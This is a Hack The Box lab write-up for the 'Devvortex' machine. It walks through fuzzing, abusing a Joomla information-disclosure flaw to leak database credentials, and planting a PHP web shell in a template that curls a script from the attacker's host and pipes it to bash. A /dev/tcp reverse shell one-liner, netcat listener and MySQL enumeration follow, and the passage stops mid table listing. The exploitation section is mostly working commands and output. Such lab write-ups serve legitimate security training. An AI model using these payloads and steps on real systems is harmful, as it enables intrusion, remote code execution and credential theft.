---
title: 'Devvortex'
date: '2026-09-20'
excerpt: 'Easy - Linux'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Devvortex</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service&#039;s configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many open TCP ports are listening on Devvortex?</p>
<p class="mb-3">Run <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.229.146 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-20 08:14 EDT
Nmap scan report for 10.129.229.146
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.56 seconds
```

<p class="mb-3">We need to add the DNS entry into <code>/etc/hosts</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ echo "10.129.229.146 devvortex.htb" | sudo tee -a /etc/hosts
10.129.229.146 devvortex.htb
```

<p class="mb-5"><strong>Answer:</strong> 2</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What subdomain is configured on the target's web server?</p>
<p class="mb-3">Our first attempt of fuzzing virtual hosts returns lots of false positives.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ ffuf -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

test                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 190ms]
mysql                   [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 191ms]
cp                      [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 191ms]
[...]
```

<p class="mb-3">To counter this, we need to add the <code>-fs</code> flag to filter out the false positives based on their size.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ ffuf -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404 -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 249ms]
:: Progress: [4989/4989] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

<p class="mb-3">We also need to add the subdomain <code>dev.devvortex.htb</code> into the <code>/etc/hosts</code> file.</p>
<p class="mb-5"><strong>Answer:</strong> dev.devvortex.htb</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What Content Management System (CMS) is running on dev.devvortex.htb?</p>
<p class="mb-3">Browsing the target website <code>http://devvortex.htb</code> in the web browser and reading accessible client-side source code unfortunately does not reveal anything. The same happens when we run <code>curl -I dev.devvortex.htb</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ curl -I dev.devvortex.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 20 Sep 2026 12:32:30 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: 1daf6e3366587cf9ab315f8ef3b5ed78=ssr61tdrove4uia1gm58tugvtm; path=/; HttpOnly
x-frame-options: SAMEORIGIN
referrer-policy: strict-origin-when-cross-origin
cross-origin-opener-policy: same-origin
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Sun, 20 Sep 2026 12:32:30 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
```

<p class="mb-3">So now our next step is to use Ffuf to perform fuzzing of potential endpoints of the target website.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ ffuf -u http://devvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fc 404 -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

# Copyright 2007 James Fisher [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 193ms]
# on at least 2 different hosts [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 193ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
#                       [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
                        [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 195ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 195ms]
#                       [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 196ms]
#                       [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 196ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 196ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 194ms]
#                       [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 199ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 195ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 189ms]
                        [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 190ms]
:: Progress: [220559/220559] :: Job [1/1] :: 2628 req/sec :: Duration: [0:01:25] :: Errors: 0 ::
```

<p class="mb-3">However this attempt does not return any useful information. Notice the results with size 178, these endpoints when viewed in the web browser, returns HTTP 403 Forbidden. So we fuzz again using Ffuf, but this time against <code>http://dev.devvortex.htb</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ ffuf -u http://dev.devvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fc 404 -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 193ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 193ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 316ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 430ms]
#                       [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 439ms]
#                       [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 493ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 627ms]
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 190ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 191ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 190ms]
#                       [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1538ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 2084ms]
# Copyright 2007 James Fisher [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 2328ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 192ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 4689ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 4591ms]
#                       [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 4752ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 4711ms]
                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 4623ms]
# on at least 2 different hosts [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 4628ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 255ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 6363ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 190ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 242ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 250ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 190ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 244ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 206ms]
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 196ms]
cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 237ms]
:: Progress: [220559/220559] :: Job [1/1] :: 114 req/sec :: Duration: [0:03:51] :: Errors: 754 ::
```

<p class="mb-3">We notice that <code>/administrator</code> exists in the fuzzing output. Viewing <code>http://dev.devvortex.htb/administrator</code> in the browser reveals that the target website is using Joomla CMS.</p>
<p class="mb-5"><strong>Answer:</strong> Joomla</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> Which version of Joomla is running on the target system?</p>
<p class="mb-3">Browsing to <code>http://dev.devvortex.htb/administrator/manifests/files/joomla.xml</code> reveals the service's version.</p>

```XML
<extension type="file" method="upgrade">
    <name>files_joomla</name>
    <author>Joomla! Project</author>
    <authorEmail>admin@joomla.org</authorEmail>
    <authorUrl>www.joomla.org</authorUrl>
    <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
    <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
    <version>4.2.6</version>
    <creationDate>2022-12</creationDate>
    <description>FILES_JOOMLA_XML_DESCRIPTION</description>
    <scriptfile>administrator/components/com_admin/script.php</scriptfile>
    <update>
        <schemas>
            <schemapath type="mysql">
                administrator/components/com_admin/sql/updates/mysql
            </schemapath>
            <schemapath type="postgresql">
                administrator/components/com_admin/sql/updates/postgresql
            </schemapath>
        </schemas>
    </update>
    <fileset>
        <files>
            <folder>administrator</folder>
            <folder>api</folder>
            <folder>cache</folder>
            <folder>cli</folder>
            <folder>components</folder>
            <folder>images</folder>
            <folder>includes</folder>
            <folder>language</folder>
            <folder>layouts</folder>
            <folder>libraries</folder>
            <folder>media</folder>
            <folder>modules</folder>
            <folder>plugins</folder>
            <folder>templates</folder>
            <folder>tmp</folder>
            <file>htaccess.txt</file>
            <file>web.config.txt</file>
            <file>LICENSE.txt</file>
            <file>README.txt</file>
            <file>index.php</file>
        </files>
    </fileset>
    <updateservers>
        <server name="Joomla! Core" type="collection">
            https://update.joomla.org/core/list.xml
        </server>
    </updateservers>
</extension>
```

<p class="mb-5"><strong>Answer:</strong> 4.2.6</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?</p>
<p class="mb-5"><strong>Answer:</strong> CVE-2023-23752</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> What is the lewis user's password for the CMS?</p>
<p class="mb-3">We use cURL to send a GET request to the <code>/api/index.php/v1/config/application?public=true</code> endpoint to gain access to sensitive data and database configuration files.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -vv
08:56:27.065264 [0-0] * Host dev.devvortex.htb:80 was resolved.
08:56:27.065330 [0-0] * IPv6: (none)
08:56:27.065378 [0-0] * IPv4: 10.129.229.146
08:56:27.065446 [0-0] * [SETUP] added
08:56:27.065517 [0-0] *   Trying 10.129.229.146:80...
08:56:27.065646 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
08:56:27.066778 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
08:56:27.256442 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
08:56:27.256508 [0-0] * Connected to dev.devvortex.htb (10.129.229.146) port 80
08:56:27.256558 [0-0] * using HTTP/1.x
08:56:27.256648 [0-0] > GET /api/index.php/v1/config/application?public=true HTTP/1.1
08:56:27.256648 [0-0] > Host: dev.devvortex.htb
08:56:27.256648 [0-0] > User-Agent: curl/8.14.1
08:56:27.256648 [0-0] > Accept: */*
08:56:27.256648 [0-0] > 
08:56:27.256909 [0-0] * Request completely sent off
08:56:27.578569 [0-0] < HTTP/1.1 200 OK
08:56:27.578645 [0-0] < Server: nginx/1.18.0 (Ubuntu)
08:56:27.578683 [0-0] < Date: Sun, 20 Sep 2026 13:04:28 GMT
08:56:27.578715 [0-0] < Content-Type: application/vnd.api+json; charset=utf-8
08:56:27.578778 [0-0] < Transfer-Encoding: chunked
08:56:27.578815 [0-0] < Connection: keep-alive
08:56:27.578853 [0-0] < x-frame-options: SAMEORIGIN
08:56:27.578891 [0-0] < referrer-policy: strict-origin-when-cross-origin
08:56:27.578921 [0-0] < cross-origin-opener-policy: same-origin
08:56:27.578958 [0-0] < X-Powered-By: JoomlaAPI/1.0
08:56:27.578989 [0-0] < Expires: Wed, 17 Aug 2005 00:00:00 GMT
08:56:27.579021 [0-0] < Last-Modified: Sun, 20 Sep 2026 13:04:28 GMT
08:56:27.579060 [0-0] < Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
08:56:27.579096 [0-0] < Pragma: no-cache
08:56:27.579128 [0-0] < 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"08:56:27.579429 [0-0] * Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

<p class="mb-5"><strong>Answer:</strong> P4ntherg0t1n5r3c0n##</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> What table in the database contains hashed credentials for the logan user?</p>
<p class="mb-3">Logging in to the Joomla administrator login page with the credentials <code>lewis</code>:<code>P4ntherg0t1n5r3c0n##</code> reveals the administrator dashboard. Clicking on the Users tab in the left sidepanel shows two users: <code>lewis</code> and <code>logan</code>.</p>

![Devvortex1](/images/devvortex_hackthebox_image1.png)

<p class="mb-3">Exploring the administrator dashboard and navigating to System > Site Templates > Cassiopeia Details and Files, we can see the current template contents.</p>

![Devvortex2](/images/devvortex_hackthebox_image2.png)

<p class="mb-3">We append a malicious PHP code to the end of the <code>error.php</code> file in order to get a shell. The PHP code will use the <code>system()</code> function to run cURL and fetch a bash script reverse shell from our local web server, which is then piped to Bash, triggering the reverse shell.</p>

```PHP
<?php system("curl 10.10.14.224:8080/rev.sh|bash"); ?>
```
<p class="mb-3">Here is the bash script we will use that will be downloaded into the target system.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.224/1337 0>&1' > rev.sh
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ ls | grep rev
rev.sh
```

<p class="mb-3">Ensure that we also have a separate terminal session open to catch the incoming reverse shell connection by running <code>nc -lvnp 1337</code>. Now we will run <code>curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"</code>, and the Netcat listener should now have an active shell. We can use <code>script /dev/null -c bash</code> to upgrade the shell.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.229.146 34482
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@devvortex:~/dev.devvortex.htb$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:~/dev.devvortex.htb$ ss -tlpn
ss -tlpn
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                                                                                       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                                                                                       
LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*                                                                                       
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*                                                                                       
LISTEN    0         511                0.0.0.0:80               0.0.0.0:*        users:(("nginx",pid=859,fd=8),("nginx",pid=858,fd=8))                          
LISTEN    0         128                   [::]:22                  [::]:*                                                                                       
LISTEN    0         511                   [::]:80                  [::]:*        users:(("nginx",pid=859,fd=9),("nginx",pid=858,fd=9))    
```

<p class="mb-3">Running <code>ss -tlpn</code> reveals that MySQL are listening locally. We then need to find the MySQL database login credentials.</p>

```console
www-data@devvortex:~/dev.devvortex.htb$ ls -al
ls -al
total 120
drwxr-xr-x 17 www-data www-data  4096 Sep 25  2023 .
drwxr-xr-x  4 root     root      4096 Oct 29  2023 ..
-rwxr-xr-x  1 www-data www-data 18092 Dec 13  2022 LICENSE.txt
-rwxr-xr-x  1 www-data www-data  4942 Dec 13  2022 README.txt
drwxr-xr-x 11 www-data www-data  4096 Dec 13  2022 administrator
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 api
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cache
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cli
drwxr-xr-x 18 www-data www-data  4096 Dec 13  2022 components
-rw-r--r--  1 www-data www-data  2037 Sep 25  2023 configuration.php
-rwxr-xr-x  1 www-data www-data  6858 Dec 13  2022 htaccess.txt
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 images
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 includes
-r-xr-x---  1 www-data www-data  1068 Dec 13  2022 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 language
drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 layouts
drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 libraries
drwxr-xr-x 71 www-data www-data  4096 Dec 13  2022 media
drwxr-xr-x 26 www-data www-data  4096 Dec 13  2022 modules
drwxr-xr-x 25 www-data www-data  4096 Dec 13  2022 plugins
-rwxr-xr-x  1 www-data www-data   764 Dec 13  2022 robots.txt
drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 templates
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 tmp
-rwxr-xr-x  1 www-data www-data  2974 Dec 13  2022 web.config.txt
www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php
cat configuration.php
<?php
class JConfig {
	public $offline = false;
	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
	public $display_offline_message = 1;
	public $offline_image = '';
	public $sitename = 'Development';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = 20;
	public $access = 1;
	public $debug = false;
	public $debug_lang = false;
	public $debug_lang_const = true;
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'lewis';
	public $password = 'P4ntherg0t1n5r3c0n##';
	public $db = 'joomla';
	public $dbprefix = 'sd4fg_';
	public $dbencryption = 0;
	public $dbsslverifyservercert = false;
	public $dbsslkey = '';
	public $dbsslcert = '';
	public $dbsslca = '';
	public $dbsslcipher = '';
	public $force_ssl = 0;
	public $live_site = '';
	public $secret = 'ZI7zLTbaGKliS9gq';
	public $gzip = false;
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
	public $offset = 'UTC';
	public $mailonline = true;
	public $mailer = 'mail';
	public $mailfrom = 'lewis@devvortex.htb';
	public $fromname = 'Development';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = false;
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = 25;
	public $caching = 0;
	public $cache_handler = 'file';
	public $cachetime = 15;
	public $cache_platformprefix = false;
	public $MetaDesc = '';
	public $MetaAuthor = true;
	public $MetaVersion = false;
	public $robots = '';
	public $sef = true;
	public $sef_rewrite = false;
	public $sef_suffix = false;
	public $unicodeslugs = false;
	public $feed_limit = 10;
	public $feed_email = 'none';
	public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
	public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
	public $lifetime = 15;
	public $session_handler = 'database';
	public $shared_session = false;
	public $session_metadata = true;
```

<p class="mb-3">Reading <code>configuration.php</code> shows us that the login credentials for the MySQL database is identical to Lewis' login credentials found earlier. We can now attempt login as Lewis using <code>mysql -u lewis -p</code>.</p>

```console
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8467
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
